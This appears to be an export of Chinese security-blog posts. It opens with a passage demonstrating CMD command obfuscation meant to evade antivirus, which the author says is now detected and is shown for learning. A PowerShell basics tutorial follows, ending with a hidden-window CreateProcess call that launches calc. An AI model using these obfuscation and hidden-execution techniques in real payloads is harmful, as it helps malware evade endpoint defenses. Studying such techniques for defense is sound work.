)   ,    ;    ;  ;   ,   ;  ;    ^D^o  ;   ,  ,    ;   ;    ,  ,    (       ,       (      ,    ;     ,       ;     ,      ;      ,      ;      ,    (      ,      (       ,     ;    ,     ;   ,   ;       ,     ;   ,     ;      ,    ;       ,     ;   ,       (     ,       ,   ,   ,    ,      ,   ,   (    ;   ,    ;  ,  ;    ;   ^S^Et        `^&#123;^&#x27;=!`^&#123;^&#x27;!!^*^_;:~   %^j,      1!)       ,       ;     ,     ;       ,      ;     ,    ;    ,     )   ,     ,       ,     )       ,    ,   ,     ,       ,      ,       ,    )       ,     ;       ,     ;       ,      ;    ,    ;      ,      ;      ,     ;       ,       ;       ,     )     ,   ,   ,    ,      ,    )&amp;&amp;   ;    ;   ;  ,  ;    ^i^F  ,   ,    ,   ;    %^j  ;  ;    ;   ,    ^E^q^u   ,  ;  ;    ,   ^5   ,  ,    ;  (     ,     ,      ,     (     ,       ,    ,      (       ,   ;    ,      ;      ,       ;     ,       ;   ,   ;   ,      (   ,   ;    ,       ;       ,      ;       ,     ;       ,    (^e^C^h^O   ;   ,   ;    ;  !`^&#123;^&#x27;:^*^`^&#123;&#x27;!^=!       |  ,  ,    ,   ;  ^F^O^r   ;   ,  ,   ;    /^f   ;    ,    ;    &quot;^ ^ ^ ^ ^ ^ ^ t^ok^en^s= ^ ^ ^ ^ ^ ^ ^+^2^ ^ ^ ^ ^de^li^m^s^=^M^Hc^L^F^e&quot;   ,  ,    ,   ;   ,   %^D    ;   ,   ,   ^iN  ;   ;  ,    ;   ;    ;   ;   (    ,  ,   ,   ,   ,  ,   &#x27;  ,   ,   ;   ,    ,   ,    ;    f^^^^T^^^^y^^^^Pe   ,   ;    ,   ;   ;   ,   ,  ^^^|  ,  ;  ,   ;   ,  ,   ^^^^F^^^^In^^^^D  ;   ,  ;    ;  &quot;Cm&quot;  ;   ,  ,   ;   ,  &#x27;  ;  ,    ;    ;    ;   ,  )   ;   ;   ;    ^d^o    ,  ;  ;  %^D, )    ,      ,    )      ,    ,    )    ;     ;       ;    ;       ;   )      )   ;  ,  ;    ;    ;  ;    ;  &quot;</span><br></pre></td></tr></table></figure>

<p>这是使用reverse 的高级混淆，但是mmts也没用把他彻底解出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">R  ;   ,    ;  ,  ;   ,   ,   /F   ;   ;  ;  ;  &quot;      tokens=   +2       delims=H0lFu&quot;  ;   ,   ;   ,  ;  ;    %V  ;   ;  ,   ,    ,  In    ,    ;  ;  ;  (   ,  ,    ,   ,    ;    ;   ,   &#x27;   ,  ;    ,  ,    ;    ,   ;  ftYPE  ;   ;  ;    ;   |    ;   ,   ;    ;  fiND   ;   ;    ,    ;    ;  ,  ,  &quot;Cm&quot;   ;  ,   ,  ,  ;    ,  &#x27;  ,   ;  ,   ;   )  ;  ,   ;   ;   ,   Do   ;   ;  ,    %V,     ;   ;  ;  ;  ,  ,   ;  9k467c/v@EOf      ;  ;   ;    ;  kwp3a/r       &quot;  ;  ;    ,   ,  ,  (       ,      ,    ,     ,     ,       (     ,    (e_y6a&gt;saY6vhuZdL+N #k6`Utp 4cHe,joY&#125;n-`59_ 1Z), &amp;]2;et?eO&amp;#&amp;,KYBN3%DIw 1lH3Pi~fb%;m(fo@)ag&#123;csKo_C&#123;E`hpF@BAwpQdB? xqszl Vq&gt;Yj|f&#123;5SZO)6?\ 6&lt;%v2\a?jzG2&amp;WS9a3`*&gt;vwmj~#t(eaTh_6taB)AXsjbD(Wy\Al:&#123;sCb\5@\MCXN?sJMP[xwS4UCyoI9&#123;2SdTw_`XnuJ|r3i~x&#123;L&amp;w[rvW,\7b;eR:#`=E;C9gOo~ Zv&gt; ArY&#x27;m$[iZ=Bt*d) ; ; ; ; ) ; ; ; ; ; )&amp;       ;  ,    ;  ,   ,    ,  ;  foR   ;   ;    ;    ;  ;  /L   ,  ,   ;    %j  ;   ,  ,    In    ;    ,   ;  ,  (     293     ,   ;    ,       ;   ,       ;       ,     -6       ,    +5      )   ,    ;    ;  ;   ,   ;  ;    Do  ;   ,  ,    ;   ;    ,  ,    (       ,       (      ,    ;     ,       ;     ,      ;      ,      ;      ,    (      ,      (       ,     ;    ,     ;   ,   ;       ,     ;   ,     ;      ,    ;       ,     ;   ,       (     ,       ,   ,   ,    ,      ,   ,   (    ;   ,    ;  ,  ;    ;      ;    ;   ;  ,  ;    iF  ,   ,    ,   ;    %j  ;  ;    ;   ,    Equ   ,  ;  ;    ,   5   ,  ,    ;  (     ,     ,      ,     (     ,       ,    ,      (       ,   ;    ,      ;      ,       ;     ,       ;   ,   ;   ,      (   ,   ;    ,       ;       ,      ;       ,     ;       ,    (echo   ;   ,   ;    ;  !`&#123;&#x27;:*`&#123;&#x27;!=!       |  ,  ,    ,   ;  FOr   ;   ,  ,   ;    /f   ;    ,    ;    &quot;       tokens=       +2    delims=MHcLFe&quot;   ,  ,    ,   ;   ,   %D    ;   ,   ,   iN  ;   ;  ,    ;   ;    ;   ;   (    ,  ,   ,   ,   ,  ,   &#x27;  ,   ,   ;   ,    ,   ,    ;    fTyPe   ,   ;    ,   ;   ;   ,   ,  |  ,  ;  ,   ;   ,  ,   FInD  ;   ,  ;    ;  &quot;Cm&quot;  ;   ,  ,   ;   ,  &#x27;  ;  ,    ;    ;    ;   ,  )   ;   ;   ;    do    ,  ;  ;  %D, )    ,      ,    )      ,    ,    )    ;     ;       ;    ;       ;   )      )   ;  ,  ;    ;    ;  ;    ;  &quot;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bac18dc8/17.png" alt="截图"></p>
<p>左侧为混淆后，右侧为使用mmts去混淆后的结果</p>
<p>直接使用ps脚本的 test 功能 火绒都会报错，很显然单单这一技术现在已经不可行，这里主要是学习一下思路</p>
<p><img src="/posts/bac18dc8/18.png" alt="截图"></p>
<p><img src="/posts/bac18dc8/19.png" alt="截图"></p>
<br>



<p>虽然现在来说可能没法去绕过杀软了（大多杀软都是从底层防御），但是还算是一种思路</p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><blockquote>
<p><a href="https://www.anquanke.com/post/id/260422">https://www.anquanke.com/post/id/260422</a><br><a href="https://www.cnblogs.com/nongchaoer/p/13054822.html">https://www.cnblogs.com/nongchaoer/p/13054822.html</a><br><a href="https://www.t00ls.cc/articles-54517.html">https://www.t00ls.cc/articles-54517.html</a><br><a href="https://cloud.tencent.com/developer/article/1633973">https://cloud.tencent.com/developer/article/1633973</a><br><a href="https://ddvvmmzz.github.io/Windows-CMD%E5%91%BD%E4%BB%A4%E5%8E%BB%E6%B7%B7%E6%B7%86">https://ddvvmmzz.github.io/Windows-CMD%E5%91%BD%E4%BB%A4%E5%8E%BB%E6%B7%B7%E6%B7%86</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>Powershell基础学习</title>
    <url>/posts/359bf983/</url>
    <content><![CDATA[<h3 id="Powershell基础"><a href="#Powershell基础" class="headerlink" title="Powershell基础"></a>Powershell基础</h3><h4 id="0x00-执行策略-amp-版本信息"><a href="#0x00-执行策略-amp-版本信息" class="headerlink" title="0x00 执行策略&amp; 版本信息"></a>0x00 执行策略&amp; 版本信息</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ExecutionPolicy</span></span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span></span><br><span class="line"></span><br><span class="line">Restricted：脚本不能运行</span><br><span class="line">RemoteSigned：在本地创建的脚本可以运行，但从网上下载的脚本不能运行（拥有数字证书签名的除外）。</span><br><span class="line">AllSigned：仅当前脚本受信任的发布者签名时才能运行。</span><br><span class="line">Unrestricted：允许所有脚本运行</span><br></pre></td></tr></table></figure>

<ul>
<li>1.0 - windows server 2008</li>
<li>2.0 - windows server 2008 r2、windows 7</li>
<li>3.0 - windows server 2012、windows 8</li>
<li>4.0 - windows server 2012 r2、windows 8.1</li>
<li>5.0 - windows 10</li>
<li>5.1 - windows server 2016</li>
</ul>
<br>

<h4 id="0x01-基本语法"><a href="#0x01-基本语法" class="headerlink" title="0x01 基本语法"></a>0x01 基本语法</h4><ul>
<li>对缩进不敏感</li>
<li>不强制分号</li>
<li>保留字、命令大小写区分</li>
<li>以{}作为代码块</li>
</ul>
<h4 id="0x02-变量"><a href="#0x02-变量" class="headerlink" title="0x02.变量"></a>0x02.变量</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">1</span></span><br><span class="line"><span class="comment"># 全局变量</span></span><br><span class="line"><span class="variable">$global:a</span> = <span class="number">1</span></span><br><span class="line"><span class="comment"># 脚本变量</span></span><br><span class="line"><span class="variable">$script:a</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出变量a</span></span><br><span class="line"><span class="built_in">Write-host</span> <span class="variable">$a</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$a</span></span><br><span class="line"><span class="comment"># 删除变量</span></span><br><span class="line"><span class="built_in">clear-variable</span></span><br><span class="line"><span class="comment"># 查看a的类型</span></span><br><span class="line"><span class="variable">$a</span>.GetType()</span><br></pre></td></tr></table></figure>

<h4 id="0x03-对象集合"><a href="#0x03-对象集合" class="headerlink" title="0x03 对象集合"></a>0x03 对象集合</h4><h5 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建和初始化数组</span><br><span class="line">$arr = 1,2,3,4,5</span><br><span class="line">$arr2 = 1..5</span><br><span class="line"></span><br><span class="line">$arr[0]</span><br><span class="line">$arr2[2..5]</span><br><span class="line"></span><br><span class="line"># 数组大小</span><br><span class="line">$arr.Length</span><br><span class="line"></span><br><span class="line">#数组操作</span><br><span class="line">$arr[2] = 8</span><br><span class="line"># 将元素添加到$arr中 </span><br><span class="line">$arr += 6</span><br><span class="line"></span><br><span class="line"># 初始化一个空数组</span><br><span class="line">$arr = @()</span><br><span class="line"></span><br><span class="line"># 从数组中删除元素</span><br><span class="line">$arr = 1..5</span><br><span class="line">$arr = ($arr[1], $arr[2], $arr[3])</span><br></pre></td></tr></table></figure>

<br>

<h5 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$dict</span> = <span class="selector-tag">@</span>&#123;&lt;key1&gt; = &lt;value1&gt; ; &lt; key2&gt; = &lt;value2&gt; ; ..... ; &lt; keyN&gt; = &lt;valueN&gt;;&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dict</span> = <span class="selector-tag">@</span>&#123;a = <span class="number">1</span>; a2 = <span class="number">2</span> ;&#125;</span><br><span class="line"><span class="variable">$dict</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Name                           Value                                                                      </span></span><br><span class="line"><span class="comment"># ----                           -----                                                                      </span></span><br><span class="line"><span class="comment"># a                              1                                                                          </span></span><br><span class="line"><span class="comment"># a2                             2   </span></span><br><span class="line"></span><br><span class="line"><span class="variable">$dict</span>.Keys</span><br><span class="line"><span class="comment"># a</span></span><br><span class="line"><span class="comment"># a2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$dict</span>.values</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示哈希表的键/值对总数</span></span><br><span class="line"><span class="variable">$dict</span>.count</span><br><span class="line"></span><br><span class="line"><span class="variable">$dict</span>.</span><br><span class="line"><span class="variable">$dict</span>.Add(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="variable">$dict</span>.Remove(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$hash</span> = <span class="selector-tag">@</span>&#123; ID = <span class="number">1</span>; Shape = <span class="string">&quot;Square&quot;</span>; Color = <span class="string">&quot;Blue&quot;</span>&#125;</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Print all hashtable keys&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.keys</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Print all hashtable values&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.values</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Get ID&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>[<span class="string">&quot;ID&quot;</span>]</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Get Shape&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Number</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;print Size&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Count</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Add key-value&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>[<span class="string">&quot;Updated&quot;</span>] = <span class="string">&quot;Now&quot;</span></span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Add key-value&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Add(<span class="string">&quot;Created&quot;</span>,<span class="string">&quot;Now&quot;</span>)</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;print Size&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Count</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Remove key-value&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Remove(<span class="string">&quot;Updated&quot;</span>)</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;print Size&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Count</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;sort by key&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.GetEnumerator() | <span class="built_in">Sort-Object</span> <span class="literal">-Property</span> key</span><br><span class="line"></span><br><span class="line"><span class="literal">-----------------</span></span><br><span class="line">Print all hashtable keys</span><br><span class="line">Color</span><br><span class="line">Shape</span><br><span class="line">ID</span><br><span class="line">Print all hashtable values</span><br><span class="line">Blue</span><br><span class="line">Square</span><br><span class="line"><span class="number">1</span></span><br><span class="line">Get ID</span><br><span class="line"><span class="number">1</span></span><br><span class="line">Get Shape</span><br><span class="line">print Size</span><br><span class="line"><span class="number">3</span></span><br><span class="line">Add key<span class="literal">-value</span></span><br><span class="line">Add key<span class="literal">-value</span></span><br><span class="line">print Size</span><br><span class="line"><span class="number">5</span></span><br><span class="line">Remove key<span class="literal">-value</span></span><br><span class="line">print Size</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="built_in">sort</span> by key</span><br><span class="line">Name Value</span><br><span class="line"><span class="literal">----</span> <span class="literal">-----</span></span><br><span class="line">Color Blue</span><br><span class="line">Created Now</span><br><span class="line">ID <span class="number">1</span></span><br><span class="line">Shape Square</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<h4 id="0x04-运算符"><a href="#0x04-运算符" class="headerlink" title="0x04  运算符"></a>0x04  运算符</h4><h5 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h5><ul>
<li>-eq        等于</li>
<li>-ne        不等于</li>
<li>-gt        大于</li>
<li>-ge        大于等于</li>
<li>-lt        小于</li>
<li>-le        小于等于</li>
</ul>
<h5 id="匹配运算符"><a href="#匹配运算符" class="headerlink" title="匹配运算符"></a>匹配运算符</h5><ul>
<li>-like</li>
<li>-notlike</li>
<li>-match</li>
<li>-notmatch</li>
</ul>
<h5 id="包含运算符"><a href="#包含运算符" class="headerlink" title="包含运算符"></a>包含运算符</h5><ul>
<li>-contains</li>
<li>-nocontains</li>
<li>-match</li>
<li>-notmatch</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;abc&quot;</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;a*&quot;</span></span><br><span class="line"><span class="variable">$c</span> = <span class="string">&quot;a??&quot;</span></span><br><span class="line"><span class="variable">$a</span> <span class="operator">-like</span> <span class="variable">$b</span></span><br><span class="line"><span class="comment"># True</span></span><br><span class="line"><span class="variable">$a</span> <span class="operator">-like</span> <span class="variable">$c</span></span><br><span class="line"><span class="comment"># True</span></span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">1</span></span><br><span class="line"><span class="variable">$a</span> <span class="operator">-contains</span> <span class="variable">$b</span></span><br><span class="line"><span class="comment"># True</span></span><br><span class="line"><span class="variable">$b</span> <span class="operator">-contains</span> <span class="variable">$a</span></span><br><span class="line"><span class="comment"># False</span></span><br></pre></td></tr></table></figure>

<h4 id="0x05-控制流程"><a href="#0x05-控制流程" class="headerlink" title="0x05 控制流程"></a>0x05 控制流程</h4><h5 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h5><ul>
<li>if else</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">1</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> <span class="operator">-eq</span> <span class="variable">$b</span>)&#123;</span><br><span class="line">  <span class="built_in">write-host</span> <span class="string">&quot;aaa&quot;</span> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$a</span> <span class="operator">-gt</span> <span class="variable">$b</span>)&#123;</span><br><span class="line">  <span class="built_in">write-host</span> <span class="string">&quot;bbb&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="built_in">write-host</span> <span class="string">&quot;ccc&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ccc</span></span><br></pre></td></tr></table></figure>

<ul>
<li>switch</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$day</span>=<span class="number">5</span></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$day</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">1</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;今天是星期一&quot;</span>&#125;</span><br><span class="line">  <span class="number">2</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;今天是星期二&quot;</span>&#125;</span><br><span class="line">  <span class="number">3</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;今天是星期三&quot;</span>&#125;</span><br><span class="line">  <span class="number">4</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;今天是星期四&quot;</span>&#125;</span><br><span class="line">  <span class="number">5</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;今天是星期五&quot;</span>&#125;</span><br><span class="line">  <span class="number">6</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;今天是星期六&quot;</span>&#125;</span><br><span class="line">  <span class="number">7</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;今天是星期日&quot;</span>&#125;</span><br><span class="line">  default&#123;<span class="built_in">echo</span> <span class="string">&quot;请输入1-7&quot;</span>&#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment"># 今天是星期五</span></span><br></pre></td></tr></table></figure>

<br>

<h5 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h5><ul>
<li>for</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="number">10</span>; <span class="variable">$i</span>=<span class="variable">$i</span>+<span class="number">1</span>)&#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>foreach</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$i</span> <span class="keyword">in</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>while</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$i</span> <span class="operator">-le</span> <span class="number">5</span>)&#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">  <span class="variable">$i</span> +=<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>do while</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">  <span class="variable">$i</span> +=<span class="number">1</span></span><br><span class="line">&#125;<span class="keyword">while</span>(<span class="variable">$i</span> <span class="operator">-le</span> <span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>continue</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$i</span>=<span class="number">1</span> </span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$i</span> <span class="operator">-le</span> <span class="number">5</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$i</span> <span class="operator">-eq</span> <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="variable">$i</span> +=<span class="number">1</span></span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">  <span class="variable">$i</span> +=<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>break</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="number">5</span>; <span class="variable">$a</span>+=<span class="number">1</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$i</span> <span class="operator">-eq</span> <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">  <span class="variable">$i</span> +=<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="0x06-函数"><a href="#0x06-函数" class="headerlink" title="0x06 函数"></a>0x06 函数</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span><span class="params">([int]<span class="variable">$x</span>)</span></span>&#123;</span><br><span class="line">  <span class="variable">$res</span> = <span class="variable">$x</span> * <span class="variable">$x</span></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$res</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$result</span> = func(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$result</span></span><br></pre></td></tr></table></figure>

<h4 id="0x07-Win32API"><a href="#0x07-Win32API" class="headerlink" title="0x07 Win32API"></a>0x07 Win32API</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建一个线程启动calc </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Add-Type</span> <span class="literal">-TypeDefinition</span> <span class="string">@&quot;    #声明</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Diagnostics;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">[StructLayout(LayoutKind.Sequential)]</span></span><br><span class="line"><span class="string">public struct PROCESS_INFORMATION</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">public IntPtr hProcess;</span></span><br><span class="line"><span class="string">public IntPtr hThread;</span></span><br><span class="line"><span class="string">public uint dwProcessId;</span></span><br><span class="line"><span class="string">public uint dwThreadId;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]</span></span><br><span class="line"><span class="string">public struct STARTUPINFO</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">public uint cb;</span></span><br><span class="line"><span class="string">public string lpReserved;</span></span><br><span class="line"><span class="string">public string lpDesktop;</span></span><br><span class="line"><span class="string">public string lpTitle;</span></span><br><span class="line"><span class="string">public uint dwX;</span></span><br><span class="line"><span class="string">public uint dwY;</span></span><br><span class="line"><span class="string">public uint dwXSize;</span></span><br><span class="line"><span class="string">public uint dwYSize;</span></span><br><span class="line"><span class="string">public uint dwXCountChars;</span></span><br><span class="line"><span class="string">public uint dwYCountChars;</span></span><br><span class="line"><span class="string">public uint dwFillAttribute;</span></span><br><span class="line"><span class="string">public uint dwFlags;</span></span><br><span class="line"><span class="string">public short wShowWindow;</span></span><br><span class="line"><span class="string">public short cbReserved2;</span></span><br><span class="line"><span class="string">public IntPtr lpReserved2;</span></span><br><span class="line"><span class="string">public IntPtr hStdInput;</span></span><br><span class="line"><span class="string">public IntPtr hStdOutput;</span></span><br><span class="line"><span class="string">public IntPtr hStdError;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">[StructLayout(LayoutKind.Sequential)]</span></span><br><span class="line"><span class="string">public struct SECURITY_ATTRIBUTES</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">public int length;</span></span><br><span class="line"><span class="string">public IntPtr lpSecurityDescriptor;</span></span><br><span class="line"><span class="string">public bool bInheritHandle;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">public static class Kernel32</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">[DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">public static extern bool CreateProcess(</span></span><br><span class="line"><span class="string">string lpApplicationName,</span></span><br><span class="line"><span class="string">string lpCommandLine,</span></span><br><span class="line"><span class="string">ref SECURITY_ATTRIBUTES lpProcessAttributes,</span></span><br><span class="line"><span class="string">ref SECURITY_ATTRIBUTES lpThreadAttributes,</span></span><br><span class="line"><span class="string">bool bInheritHandles,</span></span><br><span class="line"><span class="string">uint dwCreationFlags,</span></span><br><span class="line"><span class="string">IntPtr lpEnvironment,</span></span><br><span class="line"><span class="string">string lpCurrentDirectory,</span></span><br><span class="line"><span class="string">ref STARTUPINFO lpStartupInfo,</span></span><br><span class="line"><span class="string">out PROCESS_INFORMATION lpProcessInformation);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># StartupInfo Struct</span></span><br><span class="line"><span class="variable">$StartupInfo</span> = <span class="built_in">New-Object</span> STARTUPINFO</span><br><span class="line"><span class="variable">$StartupInfo</span>.dwFlags = <span class="number">0</span>x00000001 <span class="comment"># STARTF_USESHOWWINDOW</span></span><br><span class="line"><span class="variable">$StartupInfo</span>.wShowWindow = <span class="number">0</span>x0000 <span class="comment"># SW_HIDE</span></span><br><span class="line"><span class="variable">$StartupInfo</span>.cb = [<span class="type">System.Runtime.InteropServices.Marshal</span>]::SizeOf(<span class="variable">$StartupInfo</span>)</span><br><span class="line"><span class="comment"># Struct Size</span></span><br><span class="line"><span class="comment"># ProcessInfo Struct</span></span><br><span class="line"><span class="variable">$ProcessInfo</span> = <span class="built_in">New-Object</span> PROCESS_INFORMATION</span><br><span class="line"><span class="comment"># SECURITY_ATTRIBUTES Struct (Process &amp;amp; Thread)</span></span><br><span class="line"><span class="variable">$SecAttr</span> = <span class="built_in">New-Object</span> SECURITY_ATTRIBUTES</span><br><span class="line"><span class="variable">$SecAttr</span>.Length = [<span class="type">System.Runtime.InteropServices.Marshal</span>]::SizeOf(<span class="variable">$SecAttr</span>)</span><br><span class="line"><span class="comment"># CreateProcess In CurrentDirectory</span></span><br><span class="line"><span class="variable">$GetCurrentPath</span> = (<span class="built_in">Get-Item</span> <span class="literal">-Path</span> <span class="string">&quot;.\&quot;</span> <span class="literal">-Verbose</span>).FullName</span><br><span class="line"><span class="comment"># Call CreateProcess</span></span><br><span class="line">[<span class="type">Kernel32</span>]::CreateProcess(<span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span>, <span class="string">&quot;/c calc.exe&quot;</span>, [<span class="type">ref</span>] <span class="variable">$SecAttr</span>, [<span class="type">ref</span>] <span class="variable">$SecAttr</span>, <span class="variable">$false</span>,</span><br><span class="line"><span class="number">0</span>x08000000, [<span class="built_in">Int</span><span class="type">Ptr</span>]::Zero, <span class="variable">$GetCurrentPath</span>, [<span class="type">ref</span>] <span class="variable">$StartupInfo</span>, [<span class="type">ref</span>] <span class="variable">$ProcessInfo</span>) |<span class="built_in">out-null</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 感觉用起来比较麻烦，需要先去声明结构体啥的 再去调用</span></span><br></pre></td></tr></table></figure>

<br>

